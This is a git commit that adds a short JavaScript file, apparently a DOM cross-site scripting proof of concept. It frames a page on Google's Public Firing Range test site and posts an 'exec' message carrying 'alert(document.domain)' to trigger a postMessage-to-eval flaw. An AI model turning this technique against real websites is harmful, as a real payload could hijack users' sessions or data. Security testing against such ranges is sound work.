fbcad9088d3545ce584a3d80aee7d18f274d622c
krish760 <84552004+krishna760@users.noreply.github.com>
2023-04-26 22:25:32 -0500

    Add files via upload

---
+++ myfile.js
@@ -0,0 +1,8 @@
+var target = document.getElementById('target')
+
+target.addEventListener('load', () => {
+  
+  target.contentWindow.postMessage({"action": "exec", "payload": "alert(document.domain)"}, '*')
+})
+target.src =
+  "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval"
